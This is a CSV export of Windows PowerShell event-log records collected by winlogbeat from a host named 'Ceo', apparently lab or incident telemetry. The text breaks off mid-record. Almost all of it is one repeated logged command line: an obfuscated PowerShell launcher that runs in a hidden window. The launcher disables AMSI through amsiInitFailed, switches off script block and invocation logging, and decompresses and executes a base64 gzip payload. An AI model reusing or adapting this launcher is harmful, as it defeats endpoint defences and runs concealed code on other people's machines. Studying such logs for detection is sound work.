9Yy''+''XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg''+''M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0''+''xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD''+''X0YT72p7Tu+yPUGQYu0+12R3''+''OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+''+''YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F''+''R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+''+''1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq''+''h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8''+''iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}'')-f''='',''o'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);",1,1,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-18","-","-","{1f14668e-e63b-0000-38ca-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","2,136","5,016","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3315,"Execute a Remote Command","NT AUTHORITY","S-1-5-18",SYSTEM,User,1
"Oct 23, 2022 @ 16:53:43.253",hHkMBIQByII7dpeERBAG,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",400,"Oct 23, 2022 @ 16:53:44.409","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cd0dd99d-1cb8-4780-a4ca-1fd4faa3c0a0
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $h8=((''En{1}''+''ble''+''Sc{3}ipt{2''+''}lock{''+''0}o''+''gging'')-f''L'',''a'',''B'',''r''); $gG=((''Script{2}loc{1''+''}''+''L''+''og''+''gi{0}g'')-f''n'',''k'',''B''); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''''+''Enabl''+''{5}Sc''+''{2}iptBlo''+''c{3}{1}n{4''+''}oca''+''tion{0}ogging''+'''')-f''L'',''I'',''r'',''k'',''v'',''e'');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType(((''{''+''5}{''+''0}stem.{1}{''+''9''+''}n''+''{''+''9}''+''{2}''+''ement.{''+''7}{4}t''+''{8}m''+''{9''+''}''+''t''+''i{8}n.{7''+''}''+''ms''+''i{3}''+''ti{6''+''}s''+'''')-f''y'',''M'',''g'',''U'',''u'',''S'',''l'',''A'',''o'',''a'')); if ($xY) { $xY.GetField(((''''+''am''+''{4}''+''i''+''{''+''3}''+''{1}''+''i{2}Fai{0}ed''+'''')-f''l'',''n'',''t'',''I'',''s''),''NonPublic,Static'').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType(((''S{2}stem.{4}an''+''a{''+''1}''+''e''+''ment.A{''+''5}tomati''+''on.{0''+''}ti{3}s'')-f''U'',''g'',''y'',''l'',''M'',''u'')); $hbx=$zz4.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType(((''Sy{3''+''}t''+''e''+''m.Mana{''+''2}em''+''ent.{1}{5}to''+''mation.Sc''+''ri{''+''0}tB{4}ock'')-f''p'',''A'',''g'',''s'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb''+''46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E''+''43K''+''WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz''+''QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk''+''uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y''+''ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B''+''hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA''+''W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm''+''/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly''+''N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy''+''XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg''+''M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0''+''xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD''+''X0YT72p7Tu+yPUGQYu0+12R3''+''OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+''+''YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F''+''R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+''+''1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq''+''h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8''+''iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}'')-f''='',''o'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=5.1.19041.1682
	RunspaceId=01857599-57f2-4e3d-bbfe-00891643f17a
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Available,"-","-","-","-",None,"-","-","-","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cd0dd99d-1cb8-4780-a4ca-1fd4faa3c0a0
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $h8=((''En{1}''+''ble''+''Sc{3}ipt{2''+''}lock{''+''0}o''+''gging'')-f''L'',''a'',''B'',''r''); $gG=((''Script{2}loc{1''+''}''+''L''+''og''+''gi{0}g'')-f''n'',''k'',''B''); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''''+''Enabl''+''{5}Sc''+''{2}iptBlo''+''c{3}{1}n{4''+''}oca''+''tion{0}ogging''+'''')-f''L'',''I'',''r'',''k'',''v'',''e'');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType(((''{''+''5}{''+''0}stem.{1}{''+''9''+''}n''+''{''+''9}''+''{2}''+''ement.{''+''7}{4}t''+''{8}m''+''{9''+''}''+''t''+''i{8}n.{7''+''}''+''ms''+''i{3}''+''ti{6''+''}s''+'''')-f''y'',''M'',''g'',''U'',''u'',''S'',''l'',''A'',''o'',''a'')); if ($xY) { $xY.GetField(((''''+''am''+''{4}''+''i''+''{''+''3}''+''{1}''+''i{2}Fai{0}ed''+'''')-f''l'',''n'',''t'',''I'',''s''),''NonPublic,Static'').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType(((''S{2}stem.{4}an''+''a{''+''1}''+''e''+''ment.A{''+''5}tomati''+''on.{0''+''}ti{3}s'')-f''U'',''g'',''y'',''l'',''M'',''u'')); $hbx=$zz4.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType(((''Sy{3''+''}t''+''e''+''m.Mana{''+''2}em''+''ent.{1}{5}to''+''mation.Sc''+''ri{''+''0}tB{4}ock'')-f''p'',''A'',''g'',''s'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb''+''46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E''+''43K''+''WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz''+''QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk''+''uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y''+''ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B''+''hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA''+''W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm''+''/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly''+''N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy''+''XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg''+''M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0''+''xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD''+''X0YT72p7Tu+yPUGQYu0+12R3''+''OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+''+''YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F''+''R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+''+''1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq''+''h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8''+''iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}'')-f''='',''o'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=5.1.19041.1682
	RunspaceId=01857599-57f2-4e3d-bbfe-00891643f17a
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",400,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4562,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:53:43.207",gXkMBIQByII7dpeERBAG,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:53:44.409","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cd0dd99d-1cb8-4780-a4ca-1fd4faa3c0a0
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $h8=((''En{1}''+''ble''+''Sc{3}ipt{2''+''}lock{''+''0}o''+''gging'')-f''L'',''a'',''B'',''r''); $gG=((''Script{2}loc{1''+''}''+''L''+''og''+''gi{0}g'')-f''n'',''k'',''B''); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''''+''Enabl''+''{5}Sc''+''{2}iptBlo''+''c{3}{1}n{4''+''}oca''+''tion{0}ogging''+'''')-f''L'',''I'',''r'',''k'',''v'',''e'');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType(((''{''+''5}{''+''0}stem.{1}{''+''9''+''}n''+''{''+''9}''+''{2}''+''ement.{''+''7}{4}t''+''{8}m''+''{9''+''}''+''t''+''i{8}n.{7''+''}''+''ms''+''i{3}''+''ti{6''+''}s''+'''')-f''y'',''M'',''g'',''U'',''u'',''S'',''l'',''A'',''o'',''a'')); if ($xY) { $xY.GetField(((''''+''am''+''{4}''+''i''+''{''+''3}''+''{1}''+''i{2}Fai{0}ed''+'''')-f''l'',''n'',''t'',''I'',''s''),''NonPublic,Static'').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType(((''S{2}stem.{4}an''+''a{''+''1}''+''e''+''ment.A{''+''5}tomati''+''on.{0''+''}ti{3}s'')-f''U'',''g'',''y'',''l'',''M'',''u'')); $hbx=$zz4.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType(((''Sy{3''+''}t''+''e''+''m.Mana{''+''2}em''+''ent.{1}{5}to''+''mation.Sc''+''ri{''+''0}tB{4}ock'')-f''p'',''A'',''g'',''s'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb''+''46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E''+''43K''+''WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz''+''QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk''+''uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y''+''ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B''+''hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA''+''W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm''+''/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly''+''N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy''+''XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg''+''M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0''+''xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD''+''X0YT72p7Tu+yPUGQYu0+12R3''+''OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+''+''YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F''+''R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+''+''1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq''+''h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8''+''iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}'')-f''='',''o'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",FileSystem,"-","-","-","-",Started,"-","-","-","	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cd0dd99d-1cb8-4780-a4ca-1fd4faa3c0a0
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $h8=((''En{1}''+''ble''+''Sc{3}ipt{2''+''}lock{''+''0}o''+''gging'')-f''L'',''a'',''B'',''r''); $gG=((''Script{2}loc{1''+''}''+''L''+''og''+''gi{0}g'')-f''n'',''k'',''B''); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''''+''Enabl''+''{5}Sc''+''{2}iptBlo''+''c{3}{1}n{4''+''}oca''+''tion{0}ogging''+'''')-f''L'',''I'',''r'',''k'',''v'',''e'');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType(((''{''+''5}{''+''0}stem.{1}{''+''9''+''}n''+''{''+''9}''+''{2}''+''ement.{''+''7}{4}t''+''{8}m''+''{9''+''}''+''t''+''i{8}n.{7''+''}''+''ms''+''i{3}''+''ti{6''+''}s''+'''')-f''y'',''M'',''g'',''U'',''u'',''S'',''l'',''A'',''o'',''a'')); if ($xY) { $xY.GetField(((''''+''am''+''{4}''+''i''+''{''+''3}''+''{1}''+''i{2}Fai{0}ed''+'''')-f''l'',''n'',''t'',''I'',''s''),''NonPublic,Static'').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType(((''S{2}stem.{4}an''+''a{''+''1}''+''e''+''ment.A{''+''5}tomati''+''on.{0''+''}ti{3}s'')-f''U'',''g'',''y'',''l'',''M'',''u'')); $hbx=$zz4.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType(((''Sy{3''+''}t''+''e''+''m.Mana{''+''2}em''+''ent.{1}{5}to''+''mation.Sc''+''ri{''+''0}tB{4}ock'')-f''p'',''A'',''g'',''s'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object 